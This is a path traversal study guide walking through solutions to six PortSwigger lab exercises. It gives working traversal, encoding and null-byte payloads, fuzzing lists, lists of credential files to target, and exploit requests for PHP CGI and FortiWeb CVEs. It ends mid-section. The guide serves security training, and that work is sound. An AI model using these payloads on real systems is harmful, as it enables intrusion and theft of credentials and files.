# Path Traversal - Complete PortSwigger Labs Guide

**Complete documentation for all 6 PortSwigger Web Security Academy Path Traversal labs with step-by-step solutions, payloads, and exploitation techniques.**

---

## Table of Contents

- [Lab Overview](#lab-overview)
- [Lab 1: Simple Case](#lab-1-file-path-traversal-simple-case)
- [Lab 2: Absolute Path Bypass](#lab-2-traversal-sequences-blocked-with-absolute-path-bypass)
- [Lab 3: Non-Recursive Stripping](#lab-3-traversal-sequences-stripped-non-recursively)
- [Lab 4: Superfluous URL-Decode](#lab-4-traversal-sequences-stripped-with-superfluous-url-decode)
- [Lab 5: Path Start Validation](#lab-5-validation-of-start-of-path)
- [Lab 6: Null Byte Bypass](#lab-6-file-extension-validation-with-null-byte-bypass)
- [Burp Suite Workflow](#burp-suite-workflow)
- [Real-World CVE Examples](#real-world-cve-examples)
- [Industry Standards](#industry-standards)
- [Prevention Best Practices](#prevention-best-practices)

---

## Lab Overview

Path traversal (also known as directory traversal) enables attackers to read arbitrary files on the server running an application. This includes:
- Application code and data
- Backend system credentials
- Operating system files
- Configuration files

In some cases, attackers may write to arbitrary files, potentially modifying application data or behavior, and ultimately taking full control of the server.

### Attack Surface

Path traversal typically occurs when applications:
1. Accept user input for file operations
2. Fail to validate or sanitize file paths
3. Improperly implement security controls
4. Use blacklists instead of whitelists

---

## Lab 1: File Path Traversal, Simple Case

**Difficulty:** Apprentice
**Objective:** Retrieve the contents of the `/etc/passwd` file

### Vulnerability Description

The application displays product images by loading files from the filesystem. The vulnerable endpoint accepts a `filename` parameter that directly references files without any validation or sanitization.

**Vulnerable Request:**
```http
GET /image?filename=218.png HTTP/2
Host: TARGET.web-security-academy.net
```

### Solution Steps

#### Step 1: Identify the Vulnerable Parameter

1. Navigate to the product pages in the web shop
2. Open Burp Suite and enable interception
3. Click on a product image to trigger an image load request
4. Observe the request in Burp Proxy:
   ```http
   GET /image?filename=218.png HTTP/2
   ```

#### Step 2: Test Path Traversal

1. Send the request to Burp Repeater (Ctrl+R)
2. Modify the `filename` parameter:
   ```http
   GET /image?filename=../../../etc/passwd HTTP/2
   ```
3. Send the request
4. Observe the response contains `/etc/passwd` contents

**Successful Payload:**
```
../../../etc/passwd
```

### HTTP Request/Response

**Request:**
```http
GET /image?filename=../../../etc/passwd HTTP/2
Host: 0a2d00c204ba1a4d80b22f3d00e600b8.web-security-academy.net
Cookie: session=YOUR_SESSION_COOKIE
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: image/avif,image/webp,*/*
```

**Response:**
```http
HTTP/2 200 OK
Content-Type: image/jpeg
X-Frame-Options: SAMEORIGIN
Content-Length: 2157

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
...
```

### Key Concepts

- **Directory Traversal Sequences:** `../` navigates to the parent directory
- **Depth Testing:** Use multiple `../` sequences to traverse up the directory tree
- **Unix File System:** `/etc/passwd` is world-readable and contains user account information
- **No Validation:** The application directly uses user input in filesystem operations

### Why It Works

The application stores images in a specific directory (e.g., `/var/www/images/`). By using three levels of parent directory traversal (`../../../`), we escape this directory structure:
```
/var/www/images/ + ../../../etc/passwd
→ /var/www/ + ../../etc/passwd
→ /var/ + ../etc/passwd
→ / + etc/passwd
→ /etc/passwd
```

### Common Mistakes

1. **Insufficient Traversal Depth:** Using only one or two `../` sequences
   - Solution: Test with increasing depth (start with `../../../`)

2. **Wrong Target File:** Testing with files that don't exist
   - Solution: Use reliable target files like `/etc/passwd` (Linux) or `C:\windows\win.ini` (Windows)

3. **Forgetting Protocol:** Not using HTTP/2 or HTTP/1.1 correctly
   - Solution: Let Burp Suite handle protocol automatically

---

## Lab 2: Traversal Sequences Blocked with Absolute Path Bypass

**Difficulty:** Apprentice
**Objective:** Retrieve `/etc/passwd` when traversal sequences are blocked

### Vulnerability Description

The application implements a defense mechanism that blocks relative path traversal sequences like `../`. However, it fails to prevent absolute file path references, allowing attackers to directly specify the full path to sensitive files.

**Blocked Payload:**
```
../../../etc/passwd  ❌ Blocked
```

**Successful Payload:**
```
/etc/passwd  ✅ Works
```

### Solution Steps

#### Step 1: Confirm Traversal Blocking

1. Intercept an image request in Burp Suite
2. Try the basic traversal payload:
   ```http
   GET /image?filename=../../../etc/passwd HTTP/2
   ```
3. Observe the request is blocked or returns an error

#### Step 2: Bypass with Absolute Path

1. Modify the payload to use an absolute path:
   ```http
   GET /image?filename=/etc/passwd HTTP/2
   ```
2. Send the request
3. Observe the `/etc/passwd` contents in the response

### HTTP Request/Response

**Request:**
```http
GET /image?filename=/etc/passwd HTTP/2
Host: TARGET.web-security-academy.net
Cookie: session=YOUR_SESSION_COOKIE
```

**Response:**
```http
HTTP/2 200 OK
Content-Type: image/jpeg

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

### Key Concepts

- **Blacklist Bypass:** Security controls focused only on relative paths
- **Absolute Paths:** Direct filesystem references starting from root (`/`)
- **Incomplete Filtering:** Blocking `../` but allowing `/etc/passwd`
- **Defense Weaknesses:** Blacklist approaches miss alternative attack vectors

### Exploitation Variations

**Linux Targets:**
```
/etc/passwd
/etc/shadow (requires elevated privileges)
/etc/hosts
/proc/self/environ
/home/user/.ssh/id_rsa
```

**Windows Targets:**
```
C:\windows\win.ini
C:\windows\system32\drivers\etc\hosts
C:\inetpub\wwwroot\web.config
```

### Why It Works

The application's security filter implementation:
```python
# Vulnerable filter - blocks only relative traversal
if '../' in filename or '..\' in filename:
    return "Access Denied"

# But allows absolute paths
file_path = filename  # No validation!
return read_file(file_path)
```

**Secure Implementation:**
```python
# Proper validation
import os

ALLOWED_DIR = '/var/www/images/'
file_path = os.path.join(ALLOWED_DIR, filename)

# Canonicalize and verify the path
real_path = os.path.realpath(file_path)
if not real_path.startswith(ALLOWED_DIR):
    return "Access Denied"

return read_file(real_path)
```

### Common Mistakes

1. **Including Protocol:** Using `file:///etc/passwd` instead of `/etc/passwd`
2. **Mixing Formats:** Combining relative and absolute paths
3. **Case Sensitivity:** Using incorrect case on case-sensitive systems

---

## Lab 3: Traversal Sequences Stripped Non-Recursively

**Difficulty:** Practitioner
**Objective:** Retrieve `/etc/passwd` when traversal sequences are stripped

### Vulnerability Description

The application implements a filter that removes traversal sequences (`../` or `..\`) from user input. However, the filtering is performed only once (non-recursively), allowing attackers to nest traversal sequences that survive the stripping process.

**Defense Mechanism:**
```python
# Vulnerable non-recursive stripping
filename = filename.replace('../', '')
filename = filename.replace('..\\', '')
```

### Solution Steps

#### Step 1: Understand the Stripping Behavior

When the application strips `../` from input:
```
Input:  ....//
Remove: ....[/]/ → ../
Result: ../  (Functional traversal!)
```

#### Step 2: Craft Nested Payload

1. Intercept an image request
2. Double the traversal sequences:
   ```http
   GET /image?filename=....//....//....//etc/passwd HTTP/2
   ```
3. The filter processes this as:
   ```
   ....// → ../ (first pair)
   ....// → ../ (second pair)
   ....// → ../ (third pair)
   Final: ../../../etc/passwd
   ```

**Successful Payload:**
```
....//....//....//....//....//etc/passwd
```

### HTTP Request/Response

**Request:**
```http
GET /image?filename=....//....//....//....//....//etc/passwd HTTP/2
Host: TARGET.web-security-academy.net
```

**Response:**
```http
HTTP/2 200 OK
Content-Type: image/jpeg

root:x:0:0:root:/root:/bin/bash
...
```

### Key Concepts

- **Non-Recursive Filtering:** Single-pass removal of malicious patterns
- **Nested Sequences:** Embedding bypass payloads within the filter target
- **String Manipulation Flaws:** Poor implementation of input sanitization

### Alternative Payloads

**Different nesting patterns:**
```
..././..././..././etc/passwd
....\/....\/....\/etc/passwd (Windows)
....//...//.....///etc/passwd (mixed)
```

**Testing methodology:**
```
1. Test: ....//
2. Test: ..././
3. Test: ....\\ (Windows)
4. Test: ..../
```

### Why It Works

**Filter Logic Flow:**
```python
# Application filter
filename = "....//....//....//etc/passwd"
filename = filename.replace('../', '')

# Step-by-step processing:
"....//....//....//etc/passwd"
 → remove first '../' from '....[/]/' → "..//....//....//etc/passwd"
 → remove next '../' from '....[/]/' → "../....//....//etc/passwd"
 → remove next '../' from '....[/]/' → "../..//....//etc/passwd"
 → remove next '../' from '....[/]/' → "../../....//etc/passwd"
 → remove next '../' from '....[/]/' → "../../../etc/passwd"
```

Actually, the filter only runs once, so:
```python
"....//....//....//etc/passwd".replace('../', '')
→ "..//..//..//etc/passwd"  # Only removes exact '../' matches

# But with proper nesting:
"....//".replace('../', '') → "../"  # Character by character!
```

### Burp Suite Intruder

Automate payload testing:

**Position:**
```http
GET /image?filename=§PAYLOAD§ HTTP/2
```

**Payloads:**
```
../../../etc/passwd
....//....//....//etc/passwd
..././..././..././etc/passwd
....\/....\/....\/etc/passwd
```

**Grep - Match:**
- `root:x:0:0:root`
- `daemon:x:`

### Common Mistakes

1. **Incorrect Nesting:** Using `....//` without understanding the strip behavior
2. **Insufficient Depth:** Not using enough nested sequences
3. **Mixed Syntax:** Combining different nesting patterns inconsistently

---

## Lab 4: Traversal Sequences Stripped with Superfluous URL-Decode

**Difficulty:** Practitioner
**Objective:** Bypass URL-decode based stripping

### Vulnerability Description

The application performs two URL-decoding operations:
1. First decode: Applied by the security filter
2. Second decode: Applied by the application logic

Attackers can double-encode traversal sequences to bypass the filter, which only checks after the first decode.

**Attack Flow:**
```
Input:     ..%252f..%252f..%252fetc/passwd
Decode 1:  ..%2f..%2f..%2fetc/passwd (filter checks this)
Decode 2:  ../../../etc/passwd (application uses this)
```

### Solution Steps

#### Step 1: Understand URL Encoding

**Single Encoding:**
```
/ → %2f
. → %2e
\ → %5c
```

**Double Encoding:**
```
/ → %2f → %252f (encode the %)
. → %2e → %252e
```

#### Step 2: Craft Double-Encoded Payload

1. Start with basic traversal: `../../../etc/passwd`
2. URL encode once: `..%2f..%2f..%2fetc/passwd`
3. URL encode the `%` character: `..%252f..%252f..%252fetc/passwd`
4. Send the request:
   ```http
   GET /image?filename=..%252f..%252f..%252fetc/passwd HTTP/2
   ```

**Successful Payload:**
```
..%252f..%252f..%252fetc/passwd
```

### HTTP Request/Response

**Request:**
```http
GET /image?filename=..%252f..%252f..%252fetc/passwd HTTP/2
Host: TARGET.web-security-academy.net
```

**Response:**
```http
HTTP/2 200 OK
Content-Type: image/jpeg

root:x:0:0:root:/root:/bin/bash
...
```

### Key Concepts

- **Double Decoding:** Multiple URL decode operations in the request pipeline
- **Encoding Layers:** Security filters operating at different decode stages
- **Filter Bypass:** Obfuscating malicious input through encoding

### Encoding Reference

**Characters and Encodings:**
| Character | Single Encode | Double Encode | Triple Encode |
|-----------|---------------|---------------|---------------|
| `/` | `%2f` | `%252f` | `%25252f` |
| `\` | `%5c` | `%255c` | `%25255c` |
| `.` | `%2e` | `%252e` | `%25252e` |

**Full Traversal Encodings:**
```
../              (normal)
%2e%2e%2f        (single encode)
%252e%252e%252f  (double encode)
%25252e%25252e%25252f (triple encode)
```

### Why It Works

**Vulnerable Application Architecture:**
```python
# 1. Web server automatically URL-decodes the request
request = url_decode("..%252f..%252f..%252fetc/passwd")
# Result: ..%2f..%2f..%2fetc/passwd

# 2. Security filter checks for traversal
if '../' in request or '..\' in request:
    return "Access Denied"
# ..%2f..%2f passes this check! ✅

# 3. Application logic decodes again before file access
filename = url_decode(request)
# Result: ../../../etc/passwd ❌

# 4. File is accessed
return read_file(filename)
```

### Alternative Encoding Bypasses

**Unicode Encoding:**
```
%u002e%u002e%u002f (UTF-16)
%uff0e%uff0e%u2215 (full-width characters)
```

**Overlong UTF-8:**
```
%c0%ae%c0%ae%c0%af
%e0%80%ae%e0%80%ae%e0%80%af
```

**Mixed Encoding:**
```
..%252f..%2f../etc/passwd (some double, some single)
%2e%2e%252f%2e%2e%252f%2e%2e%252fetc/passwd
```

### Burp Suite Workflow

**Repeater Testing:**
1. Send image request to Repeater
2. Modify filename parameter
3. Use Burp's decoder to generate payloads:
   - Type: `../../../etc/passwd`
   - Encode as: URL → URL (twice)
   - Result: `..%252f..%252f..%252fetc/passwd`

**Intruder Fuzzing:**
```
Payload position: filename=§PAYLOAD§

Payloads:
1. ..%2f..%2f..%2fetc/passwd
2. ..%252f..%252f..%252fetc/passwd
3. %2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
4. %252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd
```

### Common Mistakes

1. **Single Encoding:** Using `%2f` instead of `%252f`
2. **Inconsistent Encoding:** Mixing encoded and unencoded characters
3. **Browser Auto-Decode:** Browsers may auto-decode, use Burp to ensure double encoding

---

## Lab 5: Validation of Start of Path

**Difficulty:** Practitioner
**Objective:** Bypass path prefix validation

### Vulnerability Description

The application validates that user-supplied file paths start with an expected base directory (e.g., `/var/www/images/`). However, after validating the prefix, it doesn't prevent traversal out of that directory. Attackers can include the required prefix and then traverse upward to access arbitrary files.

**Defense Mechanism:**
```python
# Vulnerable validation
if not filename.startswith('/var/www/images/'):
    return "Access Denied"

# But no check after validation!
return read_file(filename)
```

### Solution Steps

#### Step 1: Identify Required Prefix

1. Observe normal image requests:
   ```http
   GET /image?filename=/var/www/images/product1.jpg HTTP/2
   ```
2. Test with prefix removed:
   ```http
   GET /image?filename=product1.jpg HTTP/2
   ```
   Result: Access Denied or error

3. Test with wrong prefix:
   ```http
   GET /image?filename=/etc/passwd HTTP/2
   ```
   Result: Access Denied

#### Step 2: Include Prefix Then Traverse

1. Start with the required prefix: `/var/www/images/`
2. Add traversal sequences to escape: `../../../etc/passwd`
3. Combine them:
   ```http
   GET /image?filename=/var/www/images/../../../etc/passwd HTTP/2
   ```

**Successful Payload:**
```
/var/www/images/../../../etc/passwd
```

### HTTP Request/Response

**Request:**
```http
GET /image?filename=/var/www/images/../../../etc/passwd HTTP/2
Host: TARGET.web-security-academy.net
```

**Response:**
```http
HTTP/2 200 OK
Content-Type: image/jpeg

root:x:0:0:root:/root:/bin/bash
...
```

### Key Concepts

- **Prefix Validation:** Checking file path starts with expected directory
- **Insufficient Validation:** Not verifying the final resolved path
- **Path Canonicalization:** Need to resolve `.` and `..` before validation
- **TOCTOU Issues:** Time-of-check vs time-of-use vulnerabilities

### Path Resolution

**How the System Resolves the Path:**
```
Input: /var/www/images/../../../etc/passwd

Step 1: /var/www/images/..
→ /var/www/

Step 2: /var/www/../
→ /var/

Step 3: /var/../
→ /

Step 4: /etc/passwd
→ /etc/passwd

Final: /etc/passwd ✅
```

### Why It Works

**Vulnerable Code:**
```python
def load_image(filename):
    # Check if path starts with base directory
    BASE_DIR = '/var/www/images/'

    if not filename.startswith(BASE_DIR):
        return "Access Denied"

    # VULNERABILITY: No verification of final path!
    return read_file(filename)

# Attack:
filename = '/var/www/images/../../../etc/passwd'
# Passes: filename.startswith('/var/www/images/') ✅
# Returns: contents of /etc/passwd ❌
```

**Secure Implementation:**
```python
import os

def load_image(filename):
    BASE_DIR = '/var/www/images/'

    # Build full path
    full_path = os.path.join(BASE_DIR, filename)

    # Canonicalize (resolve . and ..)
    real_path = os.path.realpath(full_path)

    # Verify final path is within BASE_DIR
    if not real_path.startswith(os.path.realpath(BASE_DIR)):
        return "Access Denied"

    return read_file(real_path)
```

### Alternative Attack Vectors

**Symlink Exploitation:**
```bash
# If attacker can create symlinks in /var/www/images/
ln -s /etc/passwd /var/www/images/passwd_link

# Then request:
/var/www/images/passwd_link
```

**Different Base Directories:**
```
/var/www/images/../../../etc/passwd
/home/user/uploads/../../../etc/passwd
C:\inetpub\wwwroot\images\..\..\..\windows\win.ini
```

### Burp Suite Workflow

**Testing Prefix Requirements:**

1. **Identify base path:**
   ```http
   GET /image?filename=/var/www/images/1.jpg HTTP/2
   ```

2. **Test variations:**
   ```
   Position: filename=§PREFIX§§TRAVERSAL§etc/passwd

   PREFIX payloads:
   - /var/www/images/
   - /var/www/images
   - /images/
   - /

   TRAVERSAL payloads:
   - ../../../
   - /../../../
   - /./../../../
   ```

3. **Grep - Match:** Look for `root:x:0:0`

### Common Mistakes

1. **Missing Trailing Slash:** `/var/www/images` vs `/var/www/images/`
2. **Insufficient Traversal:** Not enough `../` to reach root
3. **Incorrect Base Path:** Guessing wrong base directory

---

## Lab 6: File Extension Validation with Null Byte Bypass

**Difficulty:** Practitioner
**Objective:** Bypass file extension validation using null bytes

### Vulnerability Description

The application validates that requested files have an expected extension (e.g., `.png`, `.jpg`). However, the underlying file system APIs may terminate string processing at null bytes (`%00`), causing the extension check to pass while accessing a different file.

**Defense Mechanism:**
```python
# Vulnerable validation
if not filename.endswith('.png'):
    return "Access Denied"

# But filesystem truncates at null byte!
read_file(filename)  # Stops reading at \x00
```

### Solution Steps

#### Step 1: Understand Null Byte Behavior

**Null Byte Characteristics:**
- ASCII value: `0x00`
- URL encoded: `%00`
- String terminator in C and many languages
- File system APIs may truncate at null byte

**Example:**
```c
// C code behavior
char filename[] = "/etc/passwd\x00.png";
FILE *f = fopen(filename, "r");
// Opens: /etc/passwd (stops at \x00, ignores .png)
```

#### Step 2: Craft Null Byte Payload

1. Start with traversal sequence: `../../../../etc/passwd`
2. Add null byte: `../../../../etc/passwd%00`
3. Add required extension: `../../../../etc/passwd%00.png`
4. Send the request:
   ```http
   GET /image?filename=../../../../etc/passwd%00.png HTTP/2
   ```

**Successful Payload:**
```
../../../../etc/passwd%00.png
```

### HTTP Request/Response

**Request:**
```http
GET /image?filename=../../../../etc/passwd%00.png HTTP/2
Host: TARGET.web-security-academy.net
```

**Response:**
```http
HTTP/2 200 OK
Content-Type: image/jpeg

root:x:0:0:root:/root:/bin/bash
...
```

### Key Concepts

- **Null Byte Injection:** Exploiting string termination behavior
- **Language Differences:** C/C++ vs Java/Python string handling
- **Legacy Vulnerabilities:** Modern languages less affected
- **PHP Magic Quotes:** Historical null byte issues

### Why It Works

**Processing Flow:**

```python
# 1. User input
filename = "../../../../etc/passwd%00.png"

# 2. URL decode
filename = url_decode(filename)
# Result: "../../../../etc/passwd\x00.png"

# 3. Extension validation (Python string)
if filename.endswith('.png'):
    # ✅ Passes: "\x00.png" ends with .png
    pass

# 4. File access (C-based filesystem API)
fd = open(filename, 'r')
# C code sees: "../../../../etc/passwd\x00..."
# Stops at \x00, opens: "../../../../etc/passwd"
```

**Language Behavior Comparison:**

| Language | Null Byte Handling | Vulnerable? |
|----------|-------------------|-------------|
| C/C++ | String terminator | ✅ Yes |
| PHP < 5.3.4 | Terminates strings | ✅ Yes |
| PHP >= 5.3.4 | Fixed in most cases | ⚠️ Sometimes |
| Java | Part of string | ❌ No |
| Python 2 | Depends on API | ⚠️ Sometimes |
| Python 3 | Part of string | ❌ Usually No |
| Node.js | Part of string | ❌ No |

### Platform-Specific Considerations

**PHP Historical Vulnerability:**
```php
<?php
// PHP < 5.3.4
$filename = $_GET['file'];

// Validation
if (substr($filename, -4) == '.php') {
    include($filename);  // Vulnerable!
}

// Attack:
// ?file=../../../../etc/passwd%00.php
// include() reads until \x00, ignores .php
?>
```

**Modern Mitigations:**
- PHP 5.3.4+: Null bytes cause warnings/errors
- Python 3: Raises ValueError on null bytes in paths
- Modern frameworks: Input sanitization removes null bytes

**Still Vulnerable Systems:**
- Legacy applications (PHP < 5.3.4)
- Custom C/C++ web servers
- CGI scripts calling C libraries
- Some file upload implementations

### Alternative Null Byte Techniques

**Multiple Null Bytes:**
```
../../../../etc/passwd%00%00.png
../../../../etc/passwd%00.png%00.jpg
```

**Null Byte with Encoding:**
```
../../../../etc/passwd%2500.png (double-encoded)
../../../../etc/passwd\x00.png (direct injection)
../../../../etc/passwd%u0000.png (Unicode)
```

**Combined with Other Bypasses:**
```
/var/www/images/../../../../etc/passwd%00.png (prefix validation)
..%252f..%252f..%252fetc/passwd%00.png (URL encode)
....//....//etc/passwd%00.png (non-recursive strip)
```

### Burp Suite Workflow

**Repeater Testing:**

1. Intercept image request
2. Send to Repeater
3. Test extension validation:
   ```http
   GET /image?filename=/etc/passwd HTTP/2
   ```
   Expected: Access Denied

4. Add required extension:
   ```http
   GET /image?filename=/etc/passwd.png HTTP/2
   ```
   Expected: File not found or error

5. Inject null byte:
   ```http
   GET /image?filename=../../../../etc/passwd%00.png HTTP/2
   ```
   Expected: Success!

**Decoder Usage:**
```
1. Input: 00 (hex)
2. Encode as: URL
3. Output: %00
4. Paste into payload: /etc/passwd[%00].png
```

**Intruder Fuzzing:**
```
Position: filename=../../../../etc/passwd§NULL§§EXT§

NULL payloads:
%00
%2500
\x00
%u0000
(empty)

EXT payloads:
.png
.jpg
.gif
.pdf
```

### Detection and Testing

**Manual Testing Checklist:**
```
1. ✓ Test basic traversal: ../../../../etc/passwd
2. ✓ Test with extension: ../../../../etc/passwd.png
3. ✓ Test with null byte: ../../../../etc/passwd%00.png
4. ✓ Test double encoding: ../../../../etc/passwd%2500.png
5. ✓ Test alternate encodings: ../../../../etc/passwd\x00.png
```

**Automated Testing:**
```bash
# Using curl
curl 'https://target.com/image?filename=../../../../etc/passwd%00.png'

# Using ffuf
ffuf -u 'https://target.com/image?filename=FUZZ' \
     -w nullbyte_payloads.txt \
     -mr "root:x"

# nullbyte_payloads.txt:
../../../../etc/passwd%00.png
../../../../etc/passwd%00.jpg
../../../../etc/passwd%2500.png
```

### Common Mistakes

1. **Using Wrong Encoding:** Typing `\x00` instead of `%00` in URL
2. **Missing Extension:** Forgetting to add required extension after null byte
3. **Testing on Modern Systems:** Null byte might not work on patched systems
4. **Not URL Encoding:** Browser might not send `%00` correctly without encoding

### Real-World Example: PHP CGI Vulnerability

**CVE-2012-1823 (PHP CGI Argument Injection):**
```http
GET /index.php?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input%00 HTTP/1.1

POST data:
<?php system('cat /etc/passwd'); ?>
```

The null byte terminated the query string, causing PHP to interpret subsequent data as PHP code.

---

## Burp Suite Workflow

### Complete Testing Methodology

#### 1. Reconnaissance Phase

**Identify Potential Vulnerabilities:**

1. **Browse the Application:**
   - Navigate through all pages
   - Note any file download/upload features
   - Look for image galleries, document viewers, file managers

2. **Enable Burp Proxy:**
   - Configure browser to use `127.0.0.1:8080`
   - Enable interception
   - Browse the application to populate site map

3. **Analyze HTTP History:**
   - Burp → Proxy → HTTP history
   - Filter for file-related parameters:
     ```
     filename=
     file=
     path=
     document=
     page=
     template=
     include=
     load=
     ```

#### 2. Burp Repeater Testing

**Manual Exploitation:**

1. **Send Request to Repeater:**
   - Right-click request → Send to Repeater (Ctrl+R)

2. **Test Basic Traversal:**
   ```http
   GET /image?filename=../../../etc/passwd HTTP/2
   ```

3. **Incremental Testing:**
   ```
   Test 1: ../etc/passwd
   Test 2: ../../etc/passwd
   Test 3: ../../../etc/passwd
   Test 4: ../../../../etc/passwd
   ```

4. **Analyze Responses:**
   - Status code (200 = success, 403 = denied, 404 = not found)
   - Content-Type header
   - Response body content
   - Look for error messages revealing information

5. **Test Bypass Techniques:**
   ```
   /etc/passwd                          (absolute)
   ....//....//etc/passwd               (nested)
   ..%252f..%252f..%252fetc/passwd      (encoded)
   /var/www/images/../../../etc/passwd  (prefix)
   ../../../../etc/passwd%00.png        (null byte)
   ```

#### 3. Burp Intruder Fuzzing

**Automated Payload Testing:**

**Position Configuration:**
```http
GET /image?filename=§PAYLOAD§ HTTP/2
Host: target.web-security-academy.net
```

**Payload Set 1 - Traversal Depth:**
```
../etc/passwd
../../etc/passwd
../../../etc/passwd
../../../../etc/passwd
../../../../../etc/passwd
../../../../../../etc/passwd
```

**Payload Set 2 - Encoding Variations:**
```
../../../etc/passwd
..%2f..%2f..%2fetc/passwd
..%252f..%252f..%252fetc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd
```

**Payload Set 3 - Bypass Techniques:**
```
....//....//....//etc/passwd
..././..././..././etc/passwd
/etc/passwd
/var/www/images/../../../etc/passwd
../../../../etc/passwd%00.png
```

**Grep - Match Settings:**
```
root:x:0:0:root
daemon:x:
bin:x:
```

**Resource Pool:**
- Maximum concurrent requests: 1 (avoid rate limiting)
- Delay between requests: 100ms

#### 4. Burp Scanner (Professional)

**Automated Vulnerability Detection:**

1. **Passive Scanning:**
   - Automatically analyzes all proxied traffic
   - Identifies potential file path parameters

2. **Active Scanning:**
   - Right-click request → Scan
   - Select "Audit checks" → File path traversal
   - Configure scan:
     - Thoroughness: Normal or Thorough
     - Test: All parameters

3. **Review Issues:**
   - Burp → Target → Issue activity
   - Filter by: "File path traversal"
   - Review evidence and recommendations

#### 5. Target File Selection

**Linux/Unix Targets:**

**Proof of Concept (Low Risk):**
```
/etc/passwd          # User accounts (world-readable)
/etc/hostname        # System hostname
/etc/os-release      # OS version info
/proc/version        # Kernel version
/proc/self/environ   # Environment variables
```

**Configuration Files (Medium Risk):**
```
/etc/apache2/apache2.conf
/etc/nginx/nginx.conf
/etc/mysql/my.cnf
/var/www/html/.env
/var/www/config/database.yml
```

**High-Value Targets (High Risk):**
```
/etc/shadow                              # Password hashes (requires root)
/root/.ssh/id_rsa                       # SSH private keys
/home/user/.ssh/id_rsa
/var/www/.git/config                    # Git configuration
/proc/self/cmdline                      # Command line
/run/secrets/kubernetes.io/serviceaccount/token
```

**Windows Targets:**

**Proof of Concept:**
```
C:\windows\win.ini
C:\windows\system32\drivers\etc\hosts
C:\windows\system32\license.rtf
```

**Configuration Files:**
```
C:\inetpub\wwwroot\web.config
C:\windows\system32\inetsrv\metabase.xml
C:\Program Files\Application\config.ini
```

**High-Value Targets:**
```
C:\windows\repair\sam
C:\windows\repair\system
C:\windows\system32\config\sam
C:\Users\Administrator\.ssh\id_rsa
```

#### 6. Evidence Collection

**Screenshot Requirements:**

1. **Original Request:**
   - Show legitimate file request
   - Highlight normal functionality

2. **Malicious Request:**
   - Show modified parameter
   - Highlight traversal payload

3. **Successful Response:**
   - Show sensitive file contents
   - Highlight key information (e.g., root user)

4. **Impact Demonstration:**
   - Multiple file retrievals
   - Different file types accessed

**HTTP Request/Response Logs:**
```
Save to file: right-click request → Save item
Include: Request, Response, Headers, Body
Format: Plain text or Base64
```

### Advanced Burp Techniques

#### Logger++ Extension

**Advanced Logging:**
1. Install Logger++ from BApp Store
2. Configure custom columns:
   - Response length
   - Response time
   - Grep matches
3. Export results for analysis

#### Turbo Intruder

**High-Speed Fuzzing:**
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=10,
        requestsPerConnection=100,
        pipeline=False
    )

    for i in range(1, 10):
        payload = '../' * i + 'etc/passwd'
        engine.queue(target.req, payload)

def handleResponse(req, interesting):
    if 'root:x:0:0' in req.response:
        table.add(req)
```

#### Collaborator Integration

**Out-of-Band Testing:**
```http
GET /image?filename=http://BURP-COLLABORATOR-SUBDOMAIN/test HTTP/2
```

Monitor for:
- DNS lookups
- HTTP requests
- SMTP connections

---

## Real-World CVE Examples

### CVE-2025-68428: jsPDF Path Traversal (2025)

**Severity:** Critical (CVSS: 8.6)
**Affected:** jsPDF library (Node.js builds)
**Impact:** Arbitrary file read and exfiltration via generated PDFs

**Vulnerability:**
The `loadFile` method in jsPDF accepts user-controlled file paths without validation. When processing PDF generation requests, the library reads specified files from disk and embeds their contents in the generated PDF output.

**Exploit Example:**
```javascript
// Vulnerable code
const { jsPDF } = require('jspdf');
const doc = new jsPDF();

// User-controlled input
const userFile = req.query.filename;

// Vulnerable file load
doc.loadFile(userFile, (data) => {
    doc.text(data, 10, 10);
    doc.save('output.pdf');
});

// Attack:
// GET /generate-pdf?filename=../../../etc/passwd
// Result: PDF contains /etc/passwd contents
```

**Impact:**
- Read any file accessible to Node.js process
- Exfiltrate database credentials from config files
- Extract source code and intellectual property
- Access cloud metadata (AWS credentials, etc.)

**Remediation:**
- Update jsPDF to patched version
- Validate and sanitize all file path inputs
- Use whitelist of allowed files
- Run Node.js process with minimal file system permissions

**Reference:** [Endor Labs CVE-2025-68428 Analysis](https://www.endorlabs.com/learn/cve-2025-68428-critical-path-traversal-in-jspdf)

---

### CVE-2025-64446: Fortinet FortiWeb (October 2025)

**Severity:** Critical (CVSS: 9.8)
**Affected:** FortiWeb management interface
**Impact:** Authentication bypass + Path traversal = Remote admin account creation

**Vulnerability:**
FortiWeb's management interface failed to validate encoded paths under `/api/v2.0/`. Attackers could abuse encoded traversal sequences to reach an internal CGI handler that trusted client-supplied identity data without credential validation.

**Exploit Chain:**
```http
1. Path Traversal to Internal Handler:
GET /api/v2.0/..%2f..%2finternal/cgi-bin/admin HTTP/1.1

2. Authentication Bypass:
X-User-Identity: admin
X-User-Authenticated: true

3. Privileged Action (Add Admin Account):
POST /internal/cgi-bin/admin/add_user HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=attacker&password=P@ssw0rd&role=administrator
```

**Attack Flow:**
```
1. Unauthenticated attacker
   ↓
2. Path traversal bypasses /api/v2.0/ restrictions
   ↓
3. Reaches /internal/cgi-bin/admin (normally restricted)
   ↓
4. CGI handler trusts X-User-Identity header
   ↓
5. Creates persistent admin account
   ↓
6. Full system compromise
```

**Impact:**
- Complete authentication bypass
- Persistent admin account creation
- WAF policy manipulation
- Network traffic monitoring/interception
- Lateral movement to protected applications

**Remediation:**
- Apply FortiWeb security patches immediately
- Implement proper path canonicalization before authorization checks
- Never trust client-supplied identity headers
- Use cryptographically signed session tokens

---

### CVE-2025-55752: Apache Tomcat (Late 2025)

**Severity:** High (CVSS: 8.1)
**Affected:** Apache Tomcat with URL rewrite rules enabled
**Impact:** Path traversal via order-of-operations flaw in URL processing

**Vulnerability:**
